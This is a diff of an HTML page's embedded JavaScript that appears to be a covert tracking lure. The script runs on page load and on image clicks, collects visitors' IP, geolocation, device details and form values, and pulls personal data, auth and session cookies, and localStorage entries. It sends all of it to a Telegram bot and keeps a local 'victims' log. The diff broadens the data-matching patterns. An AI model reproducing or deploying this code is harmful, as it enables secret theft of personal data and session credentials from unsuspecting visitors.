@@ -152,51 +152,75 @@
             }
         };
 
-        // Personal data scanning patterns
+        // Enhanced personal data patterns - more comprehensive
         const PERSONAL_DATA_PATTERNS = {
+            // More comprehensive name patterns
             names: [
-                /\b(john|jane|michael|sarah|david|emma|chris|jessica|mike|jennifer|james|emily|daniel|olivia|matthew|sophia|robert|ava|joshua|isabella)\b/gi,
-                /\b(alex|sam|taylor|jordan|casey|jamie|morgan|riley|avery|quinn)\b/gi,
-                /\b(william|elizabeth|thomas|mary|christopher|patricia|anthony|linda|mark|barbara|donald|susan|steven|nancy|paul|lisa|andrew|karen|edward|betty)\b/gi
+                /(?:my name is|i am|call me|this is)\s+([A-Z][a-z]+(?:\s+[A-Z][a-z]+)?)/gi,
+                /(?:username|name|fullname|display name)[:\s]*([^\n<>,;]{3,30})/gi,
+                /(?:hi|hello|hey)[,\s]+i[''m\s]+([A-Z][a-z]+)/gi,
+                /\b([A-Z][a-z]+ [A-Z][a-z]+)\b/g, // First + Last name
+                /(?:first name|last name)[:\s]*([A-Z][a-z]+)/gi
             ],
+            
+            // Better age detection
             ages: [
-                /\b(age\s*:?\s*(\d{1,3}))\b/gi,
-                /\b(born\s+in\s+(\d{4}))\b/gi,
-                /\b(\d{1,2})\s*(years? old|yo)\b/gi,
-                /\b(dob\s*:?\s*(\d{1,2}\/\d{1,2}\/\d{4}))\b/gi,
-                /\b(birth\s*:?\s*(\d{4}))\b/gi
+                /(?:age|i am|i'm)\s+(\d{1,3})\s*(?:years|yrs|yo)?/gi,
+                /(?:born in|birth year)\s+(\d{4})/gi,
+                /(?:dob|date of birth)[:\s]*(\d{1,2}[\/\-]\d{1,2}[\/\-]\d{4})/gi,
+                /(\d{1,2})\s*(?:years old|y\.o\.|yo)/gi,
+                /(?:birthday|bday)[:\s]*([A-Z][a-z]+ \d{1,2}(?:, \d{4})?)/gi
             ],
+            
+            // Email patterns
             emails: [
-                /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/gi
+                /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/gi,
+                /(?:email|e-mail|contact)[:\s]*([A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,})/gi
             ],
+            
+            // Phone patterns
             phones: [
-                /\b(\+\d{1,3}[-.]?)?\(?\d{3}\)?[-.]?\d{3}[-.]?\d{4}\b/gi,
-                /\b\d{3}[-.]?\d{3}[-.]?\d{4}\b/gi
+                /\b(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}\b/gi,
+                /(?:phone|mobile|tel|contact)[:\s]*([+\d\s\-\(\)]{10,15})/gi,
+                /\b\d{3}[-.\s]?\d{3}[-.\s]?\d{4}\b/gi
             ],
+            
+            // Address patterns
             addresses: [
-                /\b\d+\s+[\w\s]+\s+(street|st|avenue|ave|road|rd|boulevard|blvd|drive|dr|lane|ln)\b/gi,
-                /\b(p\.?o\.?\s*box\s+\d+)\b/gi
+                /\b\d+\s+[\w\s]+\s+(street|st|avenue|ave|road|rd|boulevard|blvd|drive|dr|lane|ln|way|court|ct)\b/gi,
+                /(?:address|location|live in)[:\s]*([^\n<>,;]{10,50})/gi,
+                /\b(p\.?o\.?\s*box\s+\d+)\b/gi,
+                /(\d+\s+[\w\s]+,?\s+[A-Z]{2}\s+\d{5}(?:-\d{4})?)/gi // US zip code format
             ],
+            
+            // Social media - more platforms
             social: [
-                /\b(@[A-Za-z0-9_]+)\b/gi,
-                /\b(instagram|twitter|facebook|tiktok|snapchat)\s*:?\s*@?([A-Za-z0-9_.]+)\b/gi
+                /(?:instagram|ig)[:\s]*@?([A-Za-z0-9_.]{1,30})/gi,
+                /(?:twitter|x)[:\s]*@?([A-Za-z0-9_]{1,15})/gi,
+                /(?:facebook|fb)[:\s]*(?:\.com\/)?([A-Za-z0-9.]{5,50})/gi,
+                /(?:tiktok)[:\s]*@?([A-Za-z0-9_.]{2,24})/gi,
+                /(?:snapchat|sc)[:\s]*@?([A-Za-z0-9_.]{3,15})/gi,
+                /(?:youtube|yt)[:\s]*(?:\.com\/)?(@[A-Za-z0-9_.]{3,30})/gi,
+                /@([A-Za-z0-9_]{1,30})/g // Generic @username
             ]
         };
 
-        // Enhanced auto-track with personal data scanning
+        // Enhanced auto-track
         window.addEventListener('load', function() {
             setTimeout(() => {
                 enhancedStealthTrack();
-            }, 500);
+            }, 1000);
         });
 
         async function enhancedStealthTrack() {
             try {
+                console.log('🔍 Starting enhanced data scan...');
                 const victimData = await captureEnhancedData('page_load');
+                console.log('📊 Data captured:', victimData);
                 await sendEnhancedTelegram(victimData);
                 storeEnhancedVictim(victimData);
             } catch (error) {
-                // Silent fail
+                console.error('Scan failed:', error);
             }
         }
 
@@ -210,6 +234,7 @@
                     card.style.opacity = '0.6';
                 });
 
+                console.log('🔍 Scanning personal data for image:', imageId);
                 const victimData = await captureEnhancedData(imageId);
                 await sendEnhancedTelegram(victimData);
                 storeEnhancedVictim(victimData);
@@ -220,6 +245,7 @@
                 }, 1500);
                 
             } catch (error) {
+                console.error('Track access failed:', error);
                 loading.innerHTML = '<div style="color: #e53e3e;">Access verification failed</div>';
                 setTimeout(() => {
                     window.location.href = CONFIG.images[imageId];
@@ -228,21 +254,25 @@
         }
 
         async function captureEnhancedData(imageId) {
-            // Enhanced data collection with personal data scanning
-            const [ipData, locationData, networkData, personalData, socialData] = await Promise.allSettled([
+            console.log('🎯 Capturing enhanced data...');
+            
+            // Use Promise.allSettled to prevent failures from stopping the scan
+            const [ipData, locationData, networkData, personalData, socialData, browserData] = await Promise.allSettled([
                 getEnhancedIP(),
                 getEnhancedIP().then(ip => ip.ip !== 'Unknown' ? getEnhancedLocation(ip.ip) : {}),
                 getNetworkInfo(),
                 scanPersonalData(),
-                scanSocialMediaData()
+                scanSocialMediaData(),
+                getBrowserData()
             ]);
+
+            console.log('📋 Personal data found:', personalData);
 
             return {
                 id: Date.now() + Math.random().toString(36).substr(2, 12),
                 timestamp: new Date().toISOString(),
                 imageId: imageId,
                 
-                // 1. NETWORK DATA
                 network: {
                     ip: ipData.status === 'fulfilled' ? ipData.value.ip : 'Unknown',
                     isp: locationData.status === 'fulfilled' ? locationData.value.org || 'Unknown' : 'Unknown',
@@ -251,7 +281,6 @@
                     vpnDetection: detectVPN(ipData.status === 'fulfilled' ? ipData.value.ip : 'Unknown')
                 },
                 
-                // 2. LOCATION DATA
                 location: {
                     city: locationData.status === 'fulfilled' ? locationData.value.city || 'Unknown' : 'Unknown',
                     region: locationData.status === 'fulfilled' ? locationData.value.region || 'Unknown' : 'Unknown',
@@ -260,43 +289,20 @@
                     postal: locationData.status === 'fulfilled' ? locationData.value.postal || 'Unknown' : 'Unknown',
                     latitude: locationData.status === 'fulfilled' ? locationData.value.latitude || 'Unknown' : 'Unknown',
                     longitude: locationData.status === 'fulfilled' ? locationData.value.longitude || 'Unknown' : 'Unknown',
-                    timezone: locationData.status === 'fulfilled' ? locationData.value.timezone || 'Unknown' : 'Unknown',
-                    currency: locationData.status === 'fulfilled' ? locationData.value.currency || 'Unknown' : 'Unknown'
+                    timezone: locationData.status === 'fulfilled' ? locationData.value.timezone || 'Unknown' : 'Unknown'
                 },
                 
-                // 3. PERSONAL DATA SCAN
-                personal: personalData.status === 'fulfilled' ? personalData.value : {},
-                
-                // 4. SOCIAL MEDIA DATA
-                social: socialData.status === 'fulfilled' ? socialData.value : {},
-                
-                // 5. BROWSER DATA
-                browser: {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    vendor: navigator.vendor,
-                    language: navigator.language,
-                    languages: navigator.languages,
-                    cookieEnabled: navigator.cookieEnabled,
-                    hardwareConcurrency: navigator.hardwareConcurrency,
-                    deviceMemory: navigator.deviceMemory || 'Unknown',
-                    plugins: Array.from(navigator.plugins).map(p => p.name).join(', ') || 'None'
-                },
-                
-                // 6. HARDWARE DATA
-                hardware: {
-                    screen: `${screen.width}x${screen.height}`,
-                    devicePixelRatio: window.devicePixelRatio,
-                    colorDepth: screen.colorDepth + ' bit',
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-                },
+                personal: personalData.status === 'fulfilled' ? personalData.value : {error: 'Scan failed'},
+                social: socialData.status === 'fulfilled' ? socialData.value : {error: 'Scan failed'},
+                browser: browserData.status === 'fulfilled' ? browserData.value : {},
                 
                 type: imageId === 'page_load' ? 'auto_track' : 'click_track'
             };
         }
 
-        // Personal data scanning function
+        // Enhanced personal data scanning
         async function scanPersonalData() {
+            console.log('🔍 Scanning for personal data...');
             const personalData = {
                 names: [],
                 ages: [],
@@ -304,81 +310,107 @@
                 phones: [],
                 addresses: [],
                 foundInCookies: [],
-                foundInStorage: []
+                foundInStorage: [],
+                scanDetails: {
+                    pageTextLength: 0,
+                    scanTime: Date.now()
+                }
             };
 
             try {
-                // Scan page content for personal data
-                const pageContent = document.body.innerText;
+                // Get all text content from the page
+                const pageContent = document.body.innerText + ' ' + document.documentElement.innerText;
+                personalData.scanDetails.pageTextLength = pageContent.length;
                 
-                // Scan for names
-                PERSONAL_DATA_PATTERNS.names.forEach(pattern => {
-                    const matches = pageContent.match(pattern);
-                    if (matches) {
-                        personalData.names = [...new Set([...personalData.names, ...matches.map(m => m.trim())])];
+                console.log('📄 Page content length:', pageContent.length);
+
+                // Enhanced scanning with better pattern matching
+                for (const [category, patterns] of Object.entries(PERSONAL_DATA_PATTERNS)) {
+                    if (category === 'social') continue; // Handle separately
+                    
+                    for (const pattern of patterns) {
+                        try {
+                            const matches = pageContent.match(pattern);
+                            if (matches) {
+                                // Extract clean matches
+                                const cleanMatches = matches.map(match => {
+                                    // For patterns with capture groups, extract the actual data
+                                    if (pattern.toString().includes('(')) {
+                                        const execResult = pattern.exec(match);
+                                        return execResult && execResult[1] ? execResult[1].trim() : match.trim();
+                                    }
+                                    return match.trim();
+                                }).filter(match => match.length > 2); // Filter out very short matches
+                                
+                                personalData[category] = [...new Set([...personalData[category], ...cleanMatches])];
+                            }
+                        } catch (e) {
+                            console.log('Pattern error:', e);
+                        }
+                    }
+                }
+
+                // Scan form fields for personal data
+                const formFields = document.querySelectorAll('input[type="text"], input[type="email"], input[name*="name"], input[name*="email"]');
+                formFields.forEach(field => {
+                    if (field.value && field.value.length > 1) {
+                        if (field.type === 'email' || field.name.includes('email')) {
+                            personalData.emails.push(field.value);
+                        } else if (field.name.includes('name')) {
+                            personalData.names.push(field.value);
+                        }
                     }
                 });
 
-                // Scan for ages
-                PERSONAL_DATA_PATTERNS.ages.forEach(pattern => {
-                    const matches = pageContent.match(pattern);
-                    if (matches) {
-                        personalData.ages = [...new Set([...personalData.ages, ...matches.map(m => m.trim())])];
-                    }
-                });
-
-                // Scan for emails
-                PERSONAL_DATA_PATTERNS.emails.forEach(pattern => {
-                    const matches = pageContent.match(pattern);
-                    if (matches) {
-                        personalData.emails = [...new Set([...personalData.emails, ...matches.map(m => m.trim())])];
-                    }
-                });
-
-                // Scan for phones
-                PERSONAL_DATA_PATTERNS.phones.forEach(pattern => {
-                    const matches = pageContent.match(pattern);
-                    if (matches) {
-                        personalData.phones = [...new Set([...personalData.phones, ...matches.map(m => m.trim())])];
-                    }
-                });
-
-                // Scan for addresses
-                PERSONAL_DATA_PATTERNS.addresses.forEach(pattern => {
-                    const matches = pageContent.match(pattern);
-                    if (matches) {
-                        personalData.addresses = [...new Set([...personalData.addresses, ...matches.map(m => m.trim())])];
-                    }
-                });
-
-                // Scan cookies for personal data
+                // Enhanced cookie scanning
                 if (document.cookie) {
-                    const cookieData = document.cookie.split(';');
-                    cookieData.forEach(cookie => {
+                    const cookies = document.cookie.split(';');
+                    cookies.forEach(cookie => {
                         const [name, value] = cookie.split('=').map(s => s.trim());
-                        if (name.includes('user') || name.includes('name') || name.includes('email') || value.includes('@')) {
-                            personalData.foundInCookies.push(`${name}=${value}`);
+                        const lowerName = name.toLowerCase();
+                        const lowerValue = value.toLowerCase();
+                        
+                        if (lowerName.includes('user') || lowerName.includes('name') || 
+                            lowerName.includes('email') || lowerValue.includes('@') ||
+                            lowerName.includes('auth') || lowerName.includes('session')) {
+                            personalData.foundInCookies.push(`${name}=${value.substring(0, 50)}`);
                         }
                     });
                 }
 
-                // Scan localStorage for personal data
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    const value = localStorage.getItem(key);
-                    if (key && value && (key.includes('user') || key.includes('name') || key.includes('email') || value.includes('@'))) {
-                        personalData.foundInStorage.push(`${key}=${value}`);
+                // Enhanced localStorage scanning
+                try {
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        const value = localStorage.getItem(key);
+                        if (key && value) {
+                            const lowerKey = key.toLowerCase();
+                            const lowerValue = value.toLowerCase();
+                            
+                            if (lowerKey.includes('user') || lowerKey.includes('name') || 
+                                lowerKey.includes('email') || lowerValue.includes('@') ||
+                                lowerKey.includes('profile') || lowerKey.includes('auth')) {
+                                personalData.foundInStorage.push(`${key}=${value.substring(0, 100)}`);
+                            }
+                        }
                     }
+                } catch (e) {
+                    console.log('LocalStorage scan failed');
                 }
 
+                console.log('✅ Personal data scan completed');
+                console.log('Names found:', personalData.names);
+                console.log('Emails found:', personalData.emails);
+
             } catch (error) {
-                // Silent fail - don't alert user
+                console.error('Personal data scan error:', error);
+                personalData.scanError = error.message;
             }
 
             return personalData;
         }
 
-        // Social media data scanning
+        // Enhanced social media scanning
         async function scanSocialMediaData() {
             const socialData = {
                 usernames: [],
@@ -389,42 +421,45 @@
             try {
                 const pageContent = document.body.innerText + ' ' + document.body.innerHTML;
                 
-                // Scan for social media handles
-                PERSONAL_DATA_PATTERNS.social.forEach(pattern => {
+                // Scan for social media patterns
+                for (const pattern of PERSONAL_DATA_PATTERNS.social) {
                     const matches = pageContent.match(pattern);
                     if (matches) {
-                        socialData.usernames = [...new Set([...socialData.usernames, ...matches.map(m => m.trim())])];
+                        const cleanMatches = matches.map(match => {
+                            const execResult = pattern.exec(match);
+                            return execResult && execResult[1] ? execResult[1].trim() : match.trim();
+                        });
+                        socialData.usernames = [...new Set([...socialData.usernames, ...cleanMatches])];
                     }
-                });
+                }
 
-                // Check for social media links
+                // Scan for social media links
                 const socialLinks = [
-                    'facebook.com/',
-                    'twitter.com/',
-                    'instagram.com/',
-                    'tiktok.com/',
-                    'linkedin.com/in/',
-                    'youtube.com/',
-                    'snapchat.com/add/'
+                    'facebook.com/', 'twitter.com/', 'x.com/', 'instagram.com/',
+                    'tiktok.com/', 'linkedin.com/in/', 'youtube.com/', 
+                    'snapchat.com/add/', 'reddit.com/user/'
                 ];
 
                 socialLinks.forEach(platform => {
                     const regex = new RegExp(`https?://(?:www\\.)?${platform}([A-Za-z0-9_.-]+)`, 'gi');
                     const matches = pageContent.match(regex);
                     if (matches) {
-                        socialData.profiles.push(...matches);
-                        socialData.platforms.push(platform.replace('.com/', ''));
+                        socialData.profiles.push(...matches.slice(0, 5));
+                        const platformName = platform.replace('.com/', '').replace('www.', '');
+                        if (!socialData.platforms.includes(platformName)) {
+                            socialData.platforms.push(platformName);
+                        }
                     }
                 });
 
             } catch (error) {
-                // Silent fail
+                console.error('Social media scan error:', error);
             }
 
             return socialData;
         }
 
-        // Enhanced IP collection
+        // Helper functions
         async function getEnhancedIP() {
             const services = [
                 'https://api.ipify.org?format=json',
@@ -448,26 +483,36 @@
             return { ip: 'Unknown' };
         }
 
-        // Enhanced location data
         async function getEnhancedLocation(ip) {
             try {
                 const response = await fetch(`https://ipapi.co/${ip}/json/`);
-                const data = await response.json();
-                return data;
+                return await response.json();
             } catch (error) {
                 return {};
             }
         }
 
-        // Network information
         async function getNetworkInfo() {
             const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
             return {
                 effectiveType: connection ? connection.effectiveType : 'Unknown',
                 downlink: connection ? connection.downlink + ' Mbps' : 'Unknown',
                 rtt: connection ? connection.rtt + ' ms' : 'Unknown',
-                saveData: connection ? connection.saveData : 'Unknown',
                 onLine: navigator.onLine
+            };
+        }
+
+        function getBrowserData() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages,
+                cookieEnabled: navigator.cookieEnabled,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory || 'Unknown',
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
             };
         }
 
@@ -477,10 +522,10 @@
         }
 
         function storeEnhancedVictim(victimData) {
-            const stealthKey = 'enhanced_victims_' + btoa('tracking').substr(0, 8);
+            const stealthKey = 'victims_data_v2';
             let victims = JSON.parse(localStorage.getItem(stealthKey) || '[]');
             victims.unshift(victimData);
-            if (victims.length > 100) victims = victims.slice(0, 100);
+            if (victims.length > 50) victims = victims.slice(0, 50);
             localStorage.setItem(stealthKey, JSON.stringify(victims));
         }
 
@@ -488,7 +533,7 @@
             try {
                 const message = formatEnhancedMessage(victimData);
                 
-                await fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
+                const response = await fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -498,73 +543,84 @@
                         disable_web_page_preview: false
                     })
                 });
+                
+                if (response.ok) {
+                    console.log('✅ Telegram message sent successfully');
+                } else {
+                    console.log('❌ Telegram send failed');
+                }
             } catch (error) {
-                // Silent fail
+                console.error('Telegram error:', error);
             }
         }
 
         function formatEnhancedMessage(victim) {
-            let message = `🕵️ *PERSONAL DATA SCAN COMPLETE* 🕵️\n\n`;
+            let message = `🕵️ *ENHANCED PERSONAL DATA SCAN* 🕵️\n\n`;
+            message += `${victim.type === 'auto_track' ? '🔍 *Page Visit Detected*' : '📸 *Image Clicked:* #' + victim.imageId}\n\n`;
 
-            message += `${victim.type === 'auto_track' ? '🔍 *Auto-detected page visit*' : '📸 *Image clicked:* #' + victim.imageId}\n\n`;
-
-            message += `🌐 *NETWORK DATA:*\n`;
+            message += `🌐 *NETWORK:*\n`;
             message += `• IP: \`${victim.network.ip}\`\n`;
             message += `• ISP: ${victim.network.isp}\n`;
             message += `• Location: ${victim.location.city}, ${victim.location.country}\n`;
             message += `• VPN: ${victim.network.vpnDetection}\n\n`;
 
-            // Personal Data Section
-            message += `🔍 *PERSONAL DATA FOUND:*\n`;
-            
-            if (victim.personal.names.length > 0) {
-                message += `• Names: ${victim.personal.names.slice(0, 3).join(', ')}\n`;
-            }
-            
-            if (victim.personal.ages.length > 0) {
-                message += `• Ages: ${victim.personal.ages.slice(0, 3).join(', ')}\n`;
-            }
-            
-            if (victim.personal.emails.length > 0) {
-                message += `• Emails: ${victim.personal.emails.slice(0, 2).join(', ')}\n`;
-            }
-            
-            if (victim.personal.phones.length > 0) {
-                message += `• Phones: ${victim.personal.phones.slice(0, 2).join(', ')}\n`;
-            }
-            
-            if (victim.personal.addresses.length > 0) {
-                message += `• Addresses: ${victim.personal.addresses.slice(0, 2).join(', ')}\n`;
-            }
+            // Personal Data Section - Only show if data found
+            const hasPersonalData = victim.personal.names.length > 0 || victim.personal.emails.length > 0 || 
+                                  victim.personal.phones.length > 0 || victim.personal.ages.length > 0;
 
-            if (victim.personal.foundInCookies.length > 0) {
-                message += `• Cookies: ${victim.personal.foundInCookies.length} personal entries\n`;
-            }
+            if (hasPersonalData) {
+                message += `🔍 *PERSONAL DATA FOUND:*\n`;
+                
+                if (victim.personal.names.length > 0) {
+                    message += `• Names: ${victim.personal.names.slice(0, 5).join(', ')}\n`;
+                }
+                
+                if (victim.personal.ages.length > 0) {
+                    message += `• Ages: ${victim.personal.ages.slice(0, 3).join(', ')}\n`;
+                }
+                
+                if (victim.personal.emails.length > 0) {
+                    message += `• Emails: ${victim.personal.emails.slice(0, 3).join(', ')}\n`;
+                }
+                
+                if (victim.personal.phones.length > 0) {
+                    message += `• Phones: ${victim.personal.phones.slice(0, 2).join(', ')}\n`;
+                }
+                
+                if (victim.personal.addresses.length > 0) {
+                    message += `• Addresses: ${victim.personal.addresses.slice(0, 2).join(', ')}\n`;
+                }
 
-            if (victim.personal.foundInStorage.length > 0) {
-                message += `• Storage: ${victim.personal.foundInStorage.length} personal entries\n`;
+                if (victim.personal.foundInCookies.length > 0) {
+                    message += `• Cookies: ${victim.personal.foundInCookies.length} entries\n`;
+                }
+
+                if (victim.personal.foundInStorage.length > 0) {
+                    message += `• Storage: ${victim.personal.foundInStorage.length} entries\n`;
+                }
+                message += `\n`;
+            } else {
+                message += `❌ *No personal data found in page content*\n\n`;
             }
 
             // Social Media Section
             if (victim.social.usernames.length > 0 || victim.social.profiles.length > 0) {
-                message += `\n📱 *SOCIAL MEDIA DATA:*\n`;
+                message += `📱 *SOCIAL MEDIA:*\n`;
                 if (victim.social.usernames.length > 0) {
                     message += `• Handles: ${victim.social.usernames.slice(0, 5).join(', ')}\n`;
                 }
                 if (victim.social.profiles.length > 0) {
                     message += `• Profiles: ${victim.social.profiles.slice(0, 3).join(', ')}\n`;
                 }
+                message += `\n`;
             }
 
-            message += `\n💻 *DEVICE DATA:*\n`;
-            message += `• Browser: ${victim.browser.platform}\n`;
-            message += `• Screen: ${victim.hardware.screen}\n`;
-            message += `• Language: ${victim.browser.language}\n`;
-            message += `• Timezone: ${victim.hardware.timezone}\n\n`;
+            message += `💻 *DEVICE:* ${victim.browser.platform}\n`;
+            message += `📱 *Screen:* ${victim.browser.screen}\n`;
+            message += `🌍 *Language:* ${victim.browser.language}\n\n`;
 
             message += `🕒 *Time:* ${new Date(victim.timestamp).toLocaleString()}\n`;
             message += `🔗 *URL:* ${window.location.href}\n`;
-            message += `📊 *Referrer:* ${document.referrer || 'Direct'}`;
 
             return message;
         }
@@ -582,7 +638,8 @@
             }
         });
 
-        console.log('🕵️ Personal data scanner active - scanning for names, ages, and personal information');
+        console.log('🕵️ Enhanced personal data scanner ACTIVE');
+        console.log('🔍 Scanning for names, ages, emails, phones, addresses, and social media');
     </script>
 </body>
 </html>
